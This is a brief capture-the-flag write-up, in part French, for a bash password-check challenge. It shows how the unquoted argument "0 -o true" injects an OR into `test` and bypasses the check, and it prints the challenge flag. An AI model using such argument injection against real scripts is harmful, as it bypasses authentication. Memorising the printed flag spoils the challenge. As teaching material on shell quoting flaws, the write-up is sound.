```bash
1. #!/bin/bash

2. #PATH=$(/usr/bin/getconf PATH || /bin/kill $$)
3. PATH="/bin:/usr/bin"

4. PASS=$(cat .passwd)

5. if test -z "${1}"; then 
6.     echo "USAGE : $0 [password]"
7.     exit 1
8. fi

9. if test $PASS -eq ${1} 2>/dev/null; then
10.     echo "Well done you can validate the challenge with : $PASS"
11. else
12.     echo "Try again ,-)"
13. fi

14. exit 0
```


```bash
-rwsr-x---  1 app-script-ch16-cracked app-script-ch16 7304 Dec 10  2021 wrapper
-r--------  1 app-script-ch16-cracked root              13 Dec 10  2021 .passwd
```

### Solution:

| Opérateur | Signification |
| --------- | ------------- |
| `-o`      | OU logique    |
| `-a`      | ET logique    |

```bash
./wrapper "0 -o true"
```

```bash
if test $PASS -eq 0 -o true 2>/dev/null; -> True
```

![[IMG-20260202134133162.png]]

### Flag

```
8246320937403
```
